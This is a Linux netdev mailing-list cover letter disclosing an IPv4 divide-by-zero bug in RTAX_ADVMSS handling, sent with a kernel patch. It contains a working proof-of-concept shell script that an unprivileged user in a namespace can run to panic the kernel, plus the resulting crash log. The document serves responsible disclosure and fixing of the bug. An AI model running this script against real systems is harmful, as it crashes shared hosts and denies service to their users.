Received: from mail-pl1-f169.google.com (mail-pl1-f169.google.com [209.85.214.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 32E2F32E143
	for <netdev@vger.kernel.org>; Thu,  6 Aug 2026 04:13:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785989627; cv=none; b=UGOn6RsUBre0UnIvXWkPxL/gXvnqYpNhw4yRU2xoOtYxBGgm8lztMdssFa92DksTcwACfN2k7EbuH9JPROU4K8654D5clioDMZ+RJL3oiNPYPkYfDuMz156vS8s4lW0rxCZCeUVTgYI+5cQeMjKqijkFWftz5rzc5iqa2iqTztg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785989627; c=relaxed/simple;
	bh=oilhTLxQ1L8UFagn5v5rZrKcl7HnVCDn/K6RucDIokg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=EubrAx0SS5vXZo65ztp5krNTqreImjQNQc9BAaKqCOoMn8Bo9hH3cPq7JeumPhJFTIz+Ct8n5PcCiM9/zOd9RahBSceYSE2pbL2TaQM56rzUJkUxMezuA5RdW1SpAQPW/i4vmQQ7XGKMuS/vJUtxLUVHhiMnzIc9Uq94oqPQX74=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=MEsNEPCs; arc=none smtp.client-ip=209.85.214.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="MEsNEPCs"
Received: by mail-pl1-f169.google.com with SMTP id d9443c01a7336-2ce87c7e3bbso16666055ad.1
        for <netdev@vger.kernel.org>; Wed, 05 Aug 2026 21:13:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785989625; x=1786594425; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=y4kwHVpCqv1Bbu1Z3Jxh+VjP83xH3akTdUiTdPzTR4M=;
        b=MEsNEPCs48nzqkrl4yDzweSqLd3WOmxRJpl7JPJqMWWCpXj53fPDoLNUZ4lB8xoEzM
         jNKrOfYM8N9akkikEwggFfUnLsXWTycFFQj5yYbUi0qEFFD+4EkfQzjEQvLgeFNxEpdf
         jS0zwwosVtfEmyiTi7gLBt1dP8+Dfnabf3HF15HEBoADqVi+JPpwrTyHYYfDRERwqiwq
         BidpYYTs/7mr2p5QUe3zpYX10rcU15CZQPvqH1FlG8EdXaGCHyMV9qjZHwFMU/XQ0klz
         i8av6mgA9Eynz7jLz5weNbVN8FA8nrJojrjsr//h8AgBfDDS+TInuiSA65/94L+DeYW+
         Tb2A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785989625; x=1786594425;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=y4kwHVpCqv1Bbu1Z3Jxh+VjP83xH3akTdUiTdPzTR4M=;
        b=ekyEwxrV1raZV8vq5tc7KDhRUJyNBOl2+GfXSmaT8+dG4jo07JR57/sfIdJWusHPLo
         GaYxPokkLZhHhfPXujdEAD7DbUFYPpfbebjibRWvy4UJoVb4HPWBRbYBCpseGYXa5GKP
         HoAiU2j3SNVqVWg9KW5lPm3J3Sot5ruvvgXGwPwiuLZfkEFor4gnWM1XC0y1dWB2QvFn
         BSkqUQ/SlexvCRHBWkx3pb4+FlWJNAtfQxzkfE1/X2JFc8jKcZXsHh0kpY8ooTW695N1
         N+1uCBlXTvkOi8CNGooQVN3Ox7bVjN4SN4SqpWYqrl6k2hy5IHfGrnPnY4TcjvNAEj44
         Fhtg==
X-Gm-Message-State: AOJu0YyGVSGsxrz8OyhsEZ1MVvujMHc5nbP60uE3Dupw2yC5uU5vqa4e
	ibs+1EAtHWvs9YyYTnc0C62JucqVSnXz+ML7SL3FwFNFVVy/5x/lkgnu3gUW9IwjOTNL4RKpsij
	FXSMpVROLIEQUtbTfnB8=
X-Gm-Gg: AR+sD13COZ9xzVS4X8uMp5cqddO19FAEaLNRHzFDciI+jPmDLjBRtTTweMlQ5F0eLiX
	RxqkUt+XhRYNhNpzWdhyfOwED73dNriQg8QQtjll2pX1XSeZsZUfHMBMXPQ5QlBgWsOq8KJdgiu
	Af61lU6btAvi0An5F8FV9g3pWZaFqKLSAIS8VZO7YEPqSW1ziEBzXHiLKxQZZEwirFQSs6zMDq/
	QoVq3QK5i7yaS3X8SynI4/0214+0i5Uon2agME6wx2mgL0Ggw704Qd9X0Axy4+pKdc7z78FogKb
	1Rv5NrvsOpcET0q3IdGV62i7hPGtuYQhmtfI9roP74DKURkuzjiHyAjDs+pPmKUu3OX8qAjobe0
	i3htYmOZLYOaj9tqpkwR/n8ZmsfuR8YaDpdDJmh/xq83urR8xPkZATOtuHc7IknEoGrx/TN1XAj
	3noQQRQiaNJs01SjIXG9t9eKDF2vbq6/wJ8NGJ8hXghORiXbv5Ru2bM2Y=
X-Received: by 2002:a17:902:e84b:b0:2ca:e5c:7fcf with SMTP id d9443c01a7336-2d0ca7b5490mr122116795ad.3.1785989625189;
        Wed, 05 Aug 2026 21:13:45 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d0aa4b6c66sm23954505ad.55.2026.08.05.21.13.39
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 05 Aug 2026 21:13:44 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	edragain@163.com,
	weir@nebusec.ai
Subject: [PATCH net RESEND 0/1] ipv4: fix divide-by-zero from undersized RTAX_ADVMSS
Date: Thu,  6 Aug 2026 12:13:37 +0800
Message-ID: <cover.1784972917.git.edragain@163.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Message-ID: <20260806041337.gnCxeBk0nTfAEKgf2RpMeKkvulHEKYjprQiq0X4UnrA@z>

From: Yong Wang <edragain@163.com>

Hi Linux kernel maintainers,

We found and validated a divide-by-zero bug in the IPv4 route metrics
handling. The bug is reachable by an unprivileged user with
CAP_NET_ADMIN in a user-created network namespace.

The attached patch fixes the bug by rejecting non-zero RTAX_ADVMSS
values smaller than TCP_MIN_MSS at the route metric input point.

---- details below ----

Bug details:

ip_metrics_convert() only caps RTAX_ADVMSS at the upper bound and
still accepts undersized non-zero values from userspace.

With a route installed using "advmss 12", a passive TCP open can later
reach tcp_openreq_init_rwin(). If SYN timestamps are enabled,
tcp_openreq_init_rwin() subtracts TCPOLEN_TSTAMP_ALIGNED from the route
advmss before calling tcp_select_initial_window(). This reduces the
effective MSS to zero and triggers a divide-by-zero in the
rounddown(space, mss) path.

The fix rejects non-zero RTAX_ADVMSS values smaller than TCP_MIN_MSS
while keeping the existing "0 means use default advmss" behavior
intact.

Reproducer:

    The reproducer script requires python3 environment

    chmod +x ./poc.sh
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

PATH=/usr/sbin:/sbin:/usr/bin:/bin
export PATH

PORT="${1:-12345}"
export PORT

unshare -Urn sh -eu <<'INNER'
cleanup() {
	[ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null || true
	[ -n "${CLI_HOLDER_PID:-}" ] && kill "$CLI_HOLDER_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

rm -f /tmp/ip_metrics_div0_cli.pid /tmp/ip_metrics_div0_srv.log

sysctl -w net.ipv4.tcp_timestamps=1 >/dev/null

unshare -n sh -c 'echo $$ > /tmp/ip_metrics_div0_cli.pid; exec sleep 1000' &
CLI_HOLDER_PID=$!

i=0
while [ ! -s /tmp/ip_metrics_div0_cli.pid ]; do
	i=$((i + 1))
	[ "$i" -lt 50 ] || {
		echo "client namespace did not start" >&2
		exit 1
	}
	sleep 0.1
done
CLIPID=$(cat /tmp/ip_metrics_div0_cli.pid)

ip link add veth-srv type veth peer name veth-cli
ip link set veth-cli netns "$CLIPID"

ip link set lo up
ip addr add 10.0.0.1/24 dev veth-srv
ip link set veth-srv up

nsenter -t "$CLIPID" -n sysctl -w net.ipv4.tcp_timestamps=1 >/dev/null
nsenter -t "$CLIPID" -n ip link set lo up
nsenter -t "$CLIPID" -n ip addr add 10.0.0.2/24 dev veth-cli
nsenter -t "$CLIPID" -n ip link set veth-cli up

ip route add 10.0.0.2/32 dev veth-srv advmss 12
ip route get 10.0.0.2

python3 -c 'import os, socket, time
port = int(os.environ["PORT"])
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.0.0.1", port))
s.listen(128)
print("listening", flush=True)
time.sleep(600)' >/tmp/ip_metrics_div0_srv.log 2>&1 &
SERVER_PID=$!

sleep 1
cat /tmp/ip_metrics_div0_srv.log

nsenter -t "$CLIPID" -n python3 -c 'import os, socket
port = int(os.environ["PORT"])
s = socket.socket()
s.settimeout(5)
s.connect(("10.0.0.1", port))'
INNER

------END poc.sh--------

----BEGIN crash log----

[  175.082064] Oops: divide error: 0000 [#1] SMP NOPTI
[  175.082793] CPU: 3 UID: 1028 PID: 1018 Comm: python3 Not tainted 6.12.95 #1
[  175.083689] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  175.085138] RIP: 0010:tcp_select_initial_window+0x43/0xe0
[  175.085867] Code: 89 d3 55 85 ff 48 89 cd 89 c1 b8 00 c0 ff 3f 53 48 8b 5c 24 20 0f 44 f8 44 8b 64 24 28 39 cf 0f 46 cf 39 ca 73 09 89 c8 31 d2 <41> f7 f3 29 d1 49 8b 42 30 0f b6 90 f9 04 00 00 b8 ff 7f 00 00 39
[  175.088227] RSP: 0018:ffffc90000170a78 EFLAGS: 00010246
[  175.088927] RAX: 0000000000010000 RBX: ffffc90000170aaf RCX: 0000000000010000
[  175.089839] RDX: 0000000000000000 RSI: 0000000000010000 RDI: 000000003fffc000
[  175.090751] RBP: ffff8881030de854 R08: ffff8881030de85c R09: 0000000000000001
[  175.091671] R10: ffff8881033aa840 R11: 0000000000000000 R12: 0000000000000000
[  175.092594] R13: ffff888104a00dc0 R14: 0000000000010000 R15: 000000000000000c
[  175.093522] FS:  00007b2b60bf7780(0000) GS:ffff88813bd80000(0000) knlGS:0000000000000000
[  175.094563] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  175.095301] CR2: 00007b2b60d237c0 CR3: 00000001132a2002 CR4: 0000000000770ef0
[  175.096200] PKRU: 55555554
[  175.096570] Call Trace:
[  175.096898]  <IRQ>
[  175.097170]  tcp_openreq_init_rwin+0x131/0x230
[  175.097768]  tcp_conn_request+0x4fa/0xd40
[  175.098304]  ? tcp_rcv_state_process+0x631/0xf40
[  175.098900]  tcp_rcv_state_process+0x631/0xf40
[  175.099425]  ? srso_alias_return_thunk+0x5/0xfbef5
[  175.099974]  ? srso_alias_return_thunk+0x5/0xfbef5
[  175.100497]  ? security_sock_rcv_skb+0x80/0xf0
[  175.100990]  ? srso_alias_return_thunk+0x5/0xfbef5
[  175.101525]  ? sk_filter_trim_cap+0x53/0x280
[  175.102000]  tcp_v4_do_rcv+0xe0/0x2a0
[  175.102413]  tcp_v4_rcv+0x139a/0x13d0
[  175.102818]  ? srso_alias_return_thunk+0x5/0xfbef5
[  175.103342]  ip_protocol_deliver_rcu+0x3b/0x1b0
[  175.103837]  ip_local_deliver_finish+0x79/0xa0
[  175.104328]  __netif_receive_skb_one_core+0x89/0xa0
[  175.104858]  process_backlog+0x99/0x1b0
[  175.105290]  __napi_poll+0x28/0x1b0
[  175.105677]  net_rx_action+0x197/0x370
[  175.106088]  handle_softirqs+0xe6/0x300
[  175.106519]  do_softirq.part.0+0x3b/0x60
[  175.106945]  </IRQ>
[  175.107183]  <TASK>
[  175.107441]  __local_bh_enable_ip+0x4f/0x60
[  175.107895]  __neigh_event_send+0xb9/0x390
[  175.108363]  neigh_resolve_output+0x12f/0x1b0
[  175.108845]  ip_finish_output2+0x185/0x540
[  175.109301]  ip_output+0x5d/0xe0
[  175.109670]  ? __pfx_ip_finish_output+0x10/0x10
[  175.110170]  __ip_queue_xmit+0x16c/0x470
[  175.110607]  __tcp_transmit_skb+0xb6e/0xcc0
[  175.111098]  ? srso_alias_return_thunk+0x5/0xfbef5
[  175.111635]  tcp_connect+0xabd/0xec0
[  175.112039]  tcp_v4_connect+0x45d/0x520
[  175.112465]  __inet_stream_connect+0xa3/0x3f0
[  175.112953]  inet_stream_connect+0x3a/0x60
[  175.113402]  __sys_connect+0xb0/0xc0
[  175.113811]  __x64_sys_connect+0x18/0x20
[  175.114254]  do_syscall_64+0x58/0x120
[  175.114677]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  175.115231] RIP: 0033:0x7b2b60c8b687
[  175.115633] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  175.117414] RSP: 002b:00007ffe84306f90 EFLAGS: 00000202 ORIG_RAX: 000000000000002a
[  175.117895] RAX: ffffffffffffffda RBX: 00007b2b60bf7780 RCX: 00007b2b60c8b687
[  175.118357] RDX: 0000000000000010 RSI: 00007ffe84307030 RDI: 0000000000000003
[  175.118819] RBP: 00007ffe84307030 R08: 0000000000000000 R09: 0000000000000000
[  175.119274] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000a83590
[  175.119725] R13: 0000000000000001 R14: 0000000000000010 R15: 00007b2b60f33080
[  175.120192]  </TASK>
[  175.120354] Modules linked in:
[  175.120593] ---[ end trace 0000000000000000 ]---
[  175.120905] RIP: 0010:tcp_select_initial_window+0x43/0xe0
[  175.121252] Code: 89 d3 55 85 ff 48 89 cd 89 c1 b8 00 c0 ff 3f 53 48 8b 5c 24 20 0f 44 f8 44 8b 64 24 28 39 cf 0f 46 cf 39 ca 73 09 89 c8 31 d2 <41> f7 f3 29 d1 49 8b 42 30 0f b6 90 f9 04 00 00 b8 ff 7f 00 00 39
[  175.122449] RSP: 0018:ffffc90000170a78 EFLAGS: 00010246
[  175.122805] RAX: 0000000000010000 RBX: ffffc90000170aaf RCX: 0000000000010000
[  175.123273] RDX: 0000000000000000 RSI: 0000000000010000 RDI: 000000003fffc000
[  175.123730] RBP: ffff8881030de854 R08: ffff8881030de85c R09: 0000000000000001
[  175.124208] R10: ffff8881033aa840 R11: 0000000000000000 R12: 0000000000000000
[  175.124679] R13: ffff888104a00dc0 R14: 0000000000010000 R15: 000000000000000c
[  175.125154] FS:  00007b2b60bf7780(0000) GS:ffff88813bd80000(0000) knlGS:0000000000000000
[  175.125679] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  175.126063] CR2: 00007b2b60d237c0 CR3: 00000001132a2002 CR4: 0000000000770ef0
[  175.126578] PKRU: 55555554
[  175.126778] Kernel panic - not syncing: Fatal exception in interrupt
[  175.127317] Kernel Offset: disabled

-----END crash log-----

Best regards,
Yong Wang


Yong Wang (1):
  ipv4: reject RTAX_ADVMSS values below TCP_MIN_MSS

 net/ipv4/metrics.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.53.0
